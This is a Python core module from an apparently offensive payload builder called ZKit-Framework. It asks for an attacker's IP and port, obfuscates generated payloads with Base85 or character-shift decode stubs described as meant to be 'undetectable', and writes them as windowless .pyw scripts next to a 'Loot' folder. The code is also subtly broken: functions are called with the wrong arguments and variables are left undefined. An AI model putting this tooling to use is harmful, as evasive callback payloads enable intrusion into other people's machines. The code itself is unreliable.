"""The Core Module of ZKit-Framework Contains : some useful methods like a custom create_file"""
import os
import random
import socket as s
import traceback
from base64 import b85encode as be
from datetime import datetime as dt

from ui_core.coloring import Color, ask_for, notify
from lib.payload import PayloadGenerator
from ui_core.payload_helper import *  # noqa
path = '/'.join(__file__.replace("\\", '/').split("/")[:-2])


ASK_FOR_ASKING_STRING = "Payload is asking for a(n) '{}'. And is required : "
ASK_FOR_REPORT_STRING = "Passing \\| to payload as {}"

ENCODING_CHOICES = {'1': 'BASE85', '2': 'ROT42'}

LANG_EXT = {"python": ".pyw", "ruby" : ".rb", "perl" : ".pl", "java" : ".java"}

def init():
    'inits the zkit . without you will get several errors'
    if os.name == "nt":
        pathslist = [path + "/Output",path + "/Output/Builded/", path + '/Output/Loot/',
                     path + "/User",
                     path + "/User/Payloads/",

                     ]
    for _path in pathslist:
        try:
            os.mkdir(f"{_path}")
        except:
            pass
    os.popen(f'echo. > "{path + "/Errors.log"}"'.format(path + "/Errors.log"))

    os.system('\t' * 400)


def _log(exception):
    with open(path + "/Errors.log", "a") as f:
        f.write("[{}] : Error {} \nFull Traceback: \n{}\n{}".format(
            dt.now(), str(exception),traceback.format_exc(), ("+" * 50)))


def crash_handler(exception):
    _log(exception)
    print("Sth went really wrong that we couldnt handle it\n"
          + "the exceptions value have saved to Errors.log\n"
          + "please report this on github to me."
          + "Do you want zkit to reraise it ? (reraising may help better) (Y/N): ", end='')
    choice = str(input()).lower()
    if choice.strip() == "y":
        print("This is going to print full error . please report it on github")
        print(traceback.format_exc())
    else:
        print("Ignoring")


class Generate:
    def __init__(self, root: str):
        "generates payloads with given root"
        from ui_core.fileop import create_file, open_file, write_file
        self.root = root
        self.pg = PayloadGenerator(self.root)
        self.get_fields()
        self.get_info()
        self.get_payload()
        self.lan = self.pg.get_language()
        self.payload = encrypt_it(self.payload, chr(random.randint(65, 122)))
        self.ext = LANG_EXT.get(self.lan, '')
        self.path = create_file(path + "/Output/Builded/" + self.path, self.ext)
        f = open_file(self.path)
        write_file(f, self.payload)
        notify('report', "Operaion Was Successful")

    def get_info(self):
        datas = []
        for field in self.fields:
            if field.lower() in ('host', 'ip', 'hostname', 'domain', 'attacker_ip'):
                data = ask_for("Whats you ip address, hostname" +
                               "left it to empty to use your own hostname (automic) : ",
                               ASK_FOR_REPORT_STRING.format("hostname"), default=['', s.gethostname],
                               )
            # so you can name it porty and portport or THEPORT or other names that 'port' is in it and zkit understand it .
            elif 'port' in field.lower():
                data = ask_for("Whats An Open Port In Your Machine " +
                               "Left It '-1' To Use Default Port (1534 Eclipse's "
                               "default communicate port) : ",
                               ASK_FOR_REPORT_STRING.format("port"),
                               default=[-1, 1534], type=int,
                               )
            else:
                data = ask_for(ASK_FOR_ASKING_STRING.format(field),
                               ASK_FOR_REPORT_STRING.format(field))
            datas.append(data)
        self.args = datas
        self.path = ask_for("Whats the filename " +
                            "for your zkit generated script : ",
                            "using \\|.pyw as your filename",
                            default=['', ''], type=str,
                            )

    def get_payload(self) -> str:
        self.payload = self.pg.interact(self.args)

    def get_fields(self) -> list:
        self.fields = self.pg.get_fields()


def _py_encrypt(payload, enc) -> str:
    if enc == "BASE85":
        payload = be(payload.encode("UTF-8")).decode("UTF-8")
        DECODE_STUB = PYTHON_DECODE_STUB_BASE85
    else:
        payload = ''.join(chr((ord(w) + 42)for w in payload))
        DECODE_STUB = PYTHON_DECODE_STUB_ROT42
    return DECODE_STUB


def _rb_encrypt(payload, enc) -> str:
    if enc_type == "BASE85":
        # i know , i know base85 is not the same with base64
        # but in ruby . if its going to be undetectable
        # we have to use built-ins
        payload = be(payload.encode("UTF-8")).decode("UTF-8")
        DECODE_STUB = RUBY_DECODE_STUB_BASE64
    else:
        payload = ''.join(chr((ord(w) + 42)for w in payload))
        DECODE_STUB = RUBY_DECODE_STUB_ROT42
    return DECODE_STUB


def _encrypt(payload, enc, lan) -> str:
    if enc == "":
        enc_type = random.choice(['BASE85', 'ROT42'])
    else:
        enc_type = ENCODING_CHOICES.get(enc, 'ROT42')

    if lan.lower() == "python":
        _py_encrypt(payload, enc_type)
    else:
        _rb_encrypt(payload, enc_type)
    return DECODE_STUB, payload


def encrypt_it(payload, b, lan) -> str:

    enc = ask_for("Which Encryption Method Would You Like To Use" +
                  "Press Enter and left it empty for choosing randomly.\n"
                  + "{1} --> Base85 (ruby base64)\n{2} --> Rot42", 
                  "Using \\| As Encryption Method")
    notify("notify", "Encrypting Data Before Writing On File...", "")
    DECODE_STUB, payload = _encrypt(payload, enc, lan)
    print("Done")
    return DECODE_STUB.format(payload, b=b)


def print_banner():
    from ui_core.banners import banner1, banner2
    "gets a random color and a random banner and prints it"
    reset = Color().GetColor('reset')
    random.seed(random.choice(
        [random.randint(1, 9999), random.randint(1, 998)]))
    banner = random.choice([banner1, banner2])
    color = Color().RandomColor()
    print(color + banner + reset)
